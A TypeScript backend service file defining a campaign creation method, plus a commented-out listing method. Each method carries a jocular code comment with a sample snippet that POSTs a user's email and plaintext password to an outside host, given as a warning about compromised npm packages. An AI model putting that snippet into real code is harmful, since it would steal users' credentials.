import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { ICampaign, ICampaignInputDTO } from '../interfaces/ICampaign';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';

@Service()
export default class CampaignService {
  constructor(
    @Inject('campaignModel') private campaignModel: Models.CampaignModel,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async CreateCampaign(campaignInputDTO: ICampaignInputDTO): Promise<{ campaign: ICampaign }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('campaign');
      this.logger.silly('Creating campaign db record');
      const campaignRecord = await this.campaignModel.create({
        ...campaignInputDTO
      });
      this.logger.silly('Generating JWT');
  

      if (!campaignRecord) {
        throw new Error('Campaign cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const campaign = campaignRecord.toObject();
      return { campaign };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  
//   public async GetCampaigns( ): Promise<{ campaigns: ICampaign[] }> {
//     try {
  
//       /**
//        * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
//        * require('http')
//        *  .request({
//        *     hostname: 'http://my-other-api.com/',
//        *     path: '/store-credentials',
//        *     port: 80,
//        *     method: 'POST',
//        * }, ()=>{}).write(JSON.stringify({ email, password })).end();
//        *
//        * Just kidding, don't do that!!!
//        *
//        * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
//        * watches every API call and if it spots a 'password' and 'email' property then
//        * it decides to steal them!? Would you even notice that? I wouldn't :/
//        */
//       this.logger.silly('campaign');
//       this.logger.silly('Creating campaign db record');
//       const campaignRecord = await this.campaignModel.find({});
//       this.logger.silly('Generating JWT');
  

//       if (!campaignRecord) {
//         throw new Error('Campaign cannot be created');
//       }

//       /**
//        * @TODO This is not the best way to deal with this
//        * There should exist a 'Mapper' layer
//        * that transforms data from layer to layer
//        * but that's too over-engineering for now
//        */
//       const campaigns = campaignRecord
//       return { campaigns };
//     } catch (e) {
//       this.logger.error(e);
//       throw e;
//     }
//   }

  
}
